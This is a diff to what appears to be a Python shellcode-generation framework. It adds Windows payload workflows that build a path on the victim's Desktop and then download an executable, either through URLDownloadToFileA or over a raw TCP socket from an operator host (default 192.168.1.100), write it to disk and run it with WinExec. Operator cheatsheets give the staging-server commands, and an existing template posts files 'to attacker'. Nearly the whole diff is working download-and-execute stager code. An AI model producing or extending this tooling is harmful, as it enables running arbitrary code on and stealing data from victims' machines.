@@ -19,6 +19,9 @@ Reference workflows:
   - tcp_download: recv loop then write-to-disk and WinExec
   - http_download: WinINet InternetReadFile loop, write-to-disk, WinExec
   - http_exfil: ReadFile loop into buffer, WinINet POST to attacker
+  - get_username: build user Desktop path, WinExec
+  - download_to_userpath: build user Desktop path, URLDownloadToFileA, WinExec
+  - tcp_download_to_userpath: build user Desktop path, TCP recv, write-to-disk, WinExec
 """
 from __future__ import annotations
 
@@ -36,12 +39,14 @@ from .ir import (
     Block,
     CallAPI,
     CallSlot,
+    CarveBuffer,
     Compare,
     ConstructString,
     DefineConstant,
     ExitStrategy,
     Immediate,
     Jump,
+    MemCopy,
     NameRef,
     SuccessPredicate,
     Terminate,
@@ -194,6 +199,14 @@ class WorkflowTemplate(PayloadTemplate):
                     _add(op.result)
                     self._collect_value_refs(op.left, _add)
                     self._collect_value_refs(op.right, _add)
+
+                elif isinstance(op, CarveBuffer):
+                    _add(op.name)
+
+                elif isinstance(op, MemCopy):
+                    self._collect_value_refs(op.dst, _add)
+                    self._collect_value_refs(op.src, _add)
+                    self._collect_value_refs(op.count, _add)
 
                 elif isinstance(op, CallSlot):
                     _add(op.target)
@@ -2051,4 +2064,404 @@ class IRHttpExfilTemplate(WorkflowTemplate):
             ("Source file on target", src),
             ("POST endpoint",
              f"http://{config.lhost}:{config.lport}{url_p}"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Shared helper: build a user Desktop path on the stack
+# ---------------------------------------------------------------------------
+
+_PATH_PREFIX = "C:\\Users\\"
+_PATH_SUFFIX = "\\Desktop\\payload.exe"
+_PATH_BUF_SIZE = 128
+
+
+def _userpath_ops(
+    prefix: str = _PATH_PREFIX,
+    suffix: str = _PATH_SUFFIX,
+    buf_size: int = _PATH_BUF_SIZE,
+) -> tuple[tuple, ...]:
+    """Return IR operations that build a user-specific path in a carved buffer.
+
+    After these ops:
+      - "path_buf" holds a pointer to the buffer
+      - "write_pos" points past the prefix
+      - The buffer contains: prefix + username + suffix + null
+    """
+    prefix_len = len(prefix)
+    suffix_len = len(suffix) + 1
+
+    return (
+        ConstructString("advapi_dll", "advapi32.dll"),
+        ConstructString("path_prefix", prefix),
+        ConstructString("path_suffix", suffix),
+        AllocateLocal("username_len"),
+        AllocateLocal("write_pos"),
+
+        CarveBuffer("path_buf", buf_size),
+
+        MemCopy(
+            NameRef("path_buf"),
+            AddressOf("path_prefix"),
+            Immediate(prefix_len),
+        ),
+
+        ArithOp("write_pos", NameRef("path_buf"),
+                 Immediate(prefix_len), "add"),
+
+        WriteSlot("username_len", Immediate(64)),
+        CallAPI(
+            "GetUserNameA",
+            arguments=(
+                NameRef("write_pos"),
+                AddressOf("username_len"),
+            ),
+            result="guna_ret",
+        ),
+
+        ArithOp("write_pos", NameRef("write_pos"),
+                 NameRef("username_len"), "add"),
+        ArithOp("write_pos", NameRef("write_pos"),
+                 Immediate(1), "sub"),
+
+        MemCopy(
+            NameRef("write_pos"),
+            AddressOf("path_suffix"),
+            Immediate(suffix_len),
+        ),
+    )
+
+
+# ---------------------------------------------------------------------------
+# Get username workflow
+# ---------------------------------------------------------------------------
+
+
+def build_get_username_workflow(
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the get_username workflow.
+
+    Builds C:\\Users\\<username>\\Desktop\\payload.exe on the stack,
+    then calls WinExec.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_get_username",
+        blocks=(
+            Block("entry", (
+                *_userpath_ops(),
+
+                CallAPI(
+                    "WinExec",
+                    arguments=(
+                        NameRef("path_buf"),
+                        Immediate(1),
+                    ),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRGetUsernameTemplate(WorkflowTemplate):
+    """IR-backed get_username template."""
+
+    def __init__(self) -> None:
+        super().__init__(build_get_username_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_get_username_workflow(exit_strategy=strategy)
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Path built on target",
+             "C:\\Users\\<username>\\Desktop\\payload.exe"),
+            ("Note", "Place payload.exe on target Desktop before running"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Download to user path workflow
+# ---------------------------------------------------------------------------
+
+
+def build_download_to_userpath_workflow(
+    url: str = "http://192.168.1.100:8000/payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the download_to_userpath workflow.
+
+    Builds user Desktop path, calls URLDownloadToFileA to fetch the
+    payload, then WinExec.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_download_to_userpath",
+        blocks=(
+            Block("entry", (
+                ConstructString("urlmon_dll", "urlmon.dll"),
+                *_userpath_ops(),
+
+                ConstructString("url_str", url),
+
+                CallAPI(
+                    "URLDownloadToFileA",
+                    arguments=(
+                        Immediate(0),
+                        AddressOf("url_str"),
+                        NameRef("path_buf"),
+                        Immediate(0),
+                        Immediate(0),
+                    ),
+                    result="dl_ret",
+                ),
+                Compare("dl_ret", SuccessPredicate.ZERO,
+                        true_block="exec", false_block="fail"),
+            )),
+
+            Block("exec", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(
+                        NameRef("path_buf"),
+                        Immediate(1),
+                    ),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRDownloadToUserpathTemplate(WorkflowTemplate):
+    """IR-backed download_to_userpath template."""
+
+    def __init__(self) -> None:
+        super().__init__(build_download_to_userpath_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_download_to_userpath_workflow(
+            url=config.url or "http://192.168.1.100:8000/payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://192.168.1.100:8000/payload.exe"
+        return [
+            ("Serve payload", f"python3 -m http.server 8000"),
+            ("Download URL", url),
+            ("Target path", "C:\\Users\\<username>\\Desktop\\payload.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# TCP download to user path workflow
+# ---------------------------------------------------------------------------
+
+
+def build_tcp_download_to_userpath_workflow(
+    lhost: str = "192.168.1.100",
+    lport: int = 9001,
+    alloc_size: int = _DEFAULT_ALLOC,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the tcp_download_to_userpath workflow.
+
+    Phase 1: Build user Desktop path (CarveBuffer + MemCopy + GetUserNameA)
+    Phase 2: WSAStartup, WSASocketA, connect, recv(4-byte size),
+             VirtualAlloc(PAGE_READWRITE), recv loop, closesocket
+    Phase 3: CreateFileA(path_buf), WriteFile, CloseHandle, WinExec
+    """
+    port_be = _socket.htons(lport)
+    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]
+
+    success, fail = _make_exit_blocks(exit_strategy)
+
+    return Workflow(
+        name="ir_tcp_download_to_userpath",
+        blocks=(
+            Block("entry", (
+                # Path building
+                *_userpath_ops(),
+
+                # Networking setup
+                AllocateStruct("wsa", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+
+                AllocateLocal("recv_size"),
+                AllocateLocal("bytes_recvd"),
+                AllocateLocal("bytes_written"),
+                AllocateLocal("recv_buf_ptr"),
+                AllocateLocal("remaining"),
+
+                # WSAStartup
+                CallAPI("WSAStartup", arguments=(
+                    Immediate(0x0202),
+                    AddressOf("wsa"),
+                ), result="wsa_ret"),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+
+            Block("create_socket", (
+                CallAPI("WSASocketA", arguments=(
+                    Immediate(2),
+                    Immediate(1),
+                    Immediate(6),
+                    Immediate(0),
+                    Immediate(0),
+                    Immediate(0),
+                ), result="socket_handle"),
+                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="connect", false_block="fail"),
+            )),
+
+            Block("connect", (
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", Immediate(2)),
+                WriteStructField("sa", "sin_port", Immediate(port_be)),
+                WriteStructField("sa", "sin_addr", Immediate(ip_le)),
+
+                CallAPI("connect", arguments=(
+                    NameRef("socket_handle"),
+                    AddressOf("sa"),
+                    Immediate(0x10),
+                ), result="conn_ret"),
+                Compare("conn_ret", SuccessPredicate.ZERO,
+                        true_block="recv_size_hdr", false_block="fail"),
+            )),
+
+            Block("recv_size_hdr", (
+                CallAPI("recv", arguments=(
+                    NameRef("socket_handle"),
+                    AddressOf("recv_size"),
+                    Immediate(4),
+                    Immediate(0),
+                ), result="recv_hdr_ret"),
+                Compare("recv_hdr_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="alloc_buf", false_block="fail"),
+            )),
+
+            Block("alloc_buf", (
+                CallAPI("VirtualAlloc", arguments=(
+                    Immediate(0),
+                    NameRef("recv_size"),
+                    Immediate(0x1000),
+                    Immediate(4),
+                ), result="virt_buf"),
+                Compare("virt_buf", SuccessPredicate.NONZERO,
+                        true_block="recv_loop_init", false_block="fail"),
+            )),
+
+            Block("recv_loop_init", (
+                WriteSlot("bytes_recvd", Immediate(0)),
+                Jump("recv_loop"),
+            )),
+
+            Block("recv_loop", (
+                ArithOp("recv_buf_ptr", NameRef("virt_buf"),
+                        NameRef("bytes_recvd"), "add"),
+                ArithOp("remaining", NameRef("recv_size"),
+                        NameRef("bytes_recvd"), "sub"),
+                CallAPI("recv", arguments=(
+                    NameRef("socket_handle"),
+                    NameRef("recv_buf_ptr"),
+                    NameRef("remaining"),
+                    Immediate(0),
+                ), result="recv_ret"),
+                Compare("recv_ret", SuccessPredicate.SIGNED_POSITIVE,
+                        true_block="accumulate", false_block="recv_done"),
+            )),
+
+            Block("accumulate", (
+                ArithOp("bytes_recvd", NameRef("bytes_recvd"),
+                        NameRef("recv_ret"), "add"),
+                ArithOp("remaining", NameRef("recv_size"),
+                        NameRef("bytes_recvd"), "sub"),
+                Compare("remaining", SuccessPredicate.NONZERO,
+                        true_block="recv_loop", false_block="recv_done"),
+            )),
+
+            Block("recv_done", (
+                CallAPI("closesocket", arguments=(
+                    NameRef("socket_handle"),
+                )),
+                Jump("write_file"),
+            )),
+
+            Block("write_file", (
+                CallAPI("CreateFileA", arguments=(
+                    NameRef("path_buf"),
+                    Immediate(0x40000000),
+                    Immediate(0),
+                    Immediate(0),
+                    Immediate(2),
+                    Immediate(0x80),
+                    Immediate(0),
+                ), result="file_handle"),
+                Compare("file_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="do_write", false_block="fail"),
+            )),
+
+            Block("do_write", (
+                CallAPI("WriteFile", arguments=(
+                    NameRef("file_handle"),
+                    NameRef("virt_buf"),
+                    NameRef("recv_size"),
+                    AddressOf("bytes_written"),
+                    Immediate(0),
+                ), result="write_ret"),
+                CallAPI("CloseHandle", arguments=(
+                    NameRef("file_handle"),
+                )),
+                CallAPI("WinExec", arguments=(
+                    NameRef("path_buf"),
+                    Immediate(1),
+                ), result="exec_ret"),
+                Jump("success"),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRTcpDownloadToUserpathTemplate(WorkflowTemplate):
+    """IR-backed tcp_download_to_userpath template."""
+
+    def __init__(self) -> None:
+        super().__init__(build_tcp_download_to_userpath_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_tcp_download_to_userpath_workflow(
+            lhost=config.lhost,
+            lport=config.lport,
+            alloc_size=config.alloc_size or _DEFAULT_ALLOC,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Start staging server",
+             f"python3 tcp_stage_server.py --bind {config.lhost} "
+             f"--port {config.lport} payload.exe"),
+            ("Target path", "C:\\Users\\<username>\\Desktop\\payload.exe"),
         ]
